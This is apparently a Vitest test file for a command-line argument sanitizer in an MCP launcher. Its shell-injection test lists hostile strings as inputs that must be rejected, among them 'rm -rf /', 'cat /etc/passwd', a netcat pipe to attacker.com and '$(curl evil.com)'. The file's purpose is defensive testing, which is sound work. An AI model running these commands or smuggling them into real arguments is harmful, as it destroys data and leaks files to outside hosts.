import { describe, expect, it } from 'vitest'
import { sanitizeCommandLineArgs } from './security-utils.ts'

describe('MCP Launcher Security', () => {
  describe('sanitizeCommandLineArgs', () => {
    it('should allow safe arguments', () => {
      // Arrange
      const safeArgs = [
        '--port=3000',
        '--host=localhost',
        '--debug',
        'config.json',
        '/path/to/file.ts',
        'module-name',
        'value123',
        'snake_case_value',
        'kebab-case-value',
      ]

      // Act
      const result = sanitizeCommandLineArgs(safeArgs)

      // Assert
      expect(result).toEqual(safeArgs)
    })

    it('should reject shell injection attempts', () => {
      // Arrange
      const maliciousArgs = [
        '--port=3000; rm -rf /',
        '--host=`whoami`',
        '--debug && cat /etc/passwd',
        'config.json | nc attacker.com 1234',
        '$(curl evil.com)',
        '--value=${HOME}',
        'arg > /dev/null',
        'arg < input.txt',
        'arg1 || arg2',
        'arg1 && arg2',
      ]

      // Act
      const result = sanitizeCommandLineArgs(maliciousArgs)

      // Assert
      expect(result).toEqual([])
    })

    it('should reject arguments with spaces and special characters', () => {
      // Arrange
      const unsafeArgs = [
        'arg with spaces',
        'arg\twith\ttabs',
        'arg\nwith\nnewlines',
        'arg"with"quotes',
        "arg'with'quotes",
        'arg\\with\\backslashes',
        'arg*with*wildcards',
        'arg?with?wildcards',
        'arg(with)parentheses',
        'arg[with]brackets',
        'arg{with}braces',
      ]

      // Act
      const result = sanitizeCommandLineArgs(unsafeArgs)

      // Assert
      expect(result).toEqual([])
    })

    it('should reject empty arguments', () => {
      // Arrange
      const args = ['valid-arg', '', 'another-valid-arg']

      // Act
      const result = sanitizeCommandLineArgs(args)

      // Assert
      expect(result).toEqual(['valid-arg', 'another-valid-arg'])
    })

    it('should reject oversized arguments', () => {
      // Arrange
      const longArg = 'a'.repeat(1000)
      const args = ['valid-arg', longArg, 'another-valid-arg']

      // Act
      const result = sanitizeCommandLineArgs(args)

      // Assert
      expect(result).toEqual(['valid-arg', 'another-valid-arg'])
    })

    it('should limit total number of arguments', () => {
      // Arrange
      const manyArgs = Array(100).fill('valid-arg')

      // Act
      const result = sanitizeCommandLineArgs(manyArgs)

      // Assert
      expect(result.length).toBeLessThanOrEqual(50)
    })

    it('should reject non-string arguments', () => {
      // Arrange
      const mixedArgs = [
        'valid-string',
        123 as any,
        { object: 'value' } as any,
        null as any,
        undefined as any,
        'another-valid-string',
      ]

      // Act
      const result = sanitizeCommandLineArgs(mixedArgs)

      // Assert
      expect(result).toEqual(['valid-string', 'another-valid-string'])
    })

    it('should handle empty array', () => {
      // Arrange
      const args: string[] = []

      // Act
      const result = sanitizeCommandLineArgs(args)

      // Assert
      expect(result).toEqual([])
    })
  })
})
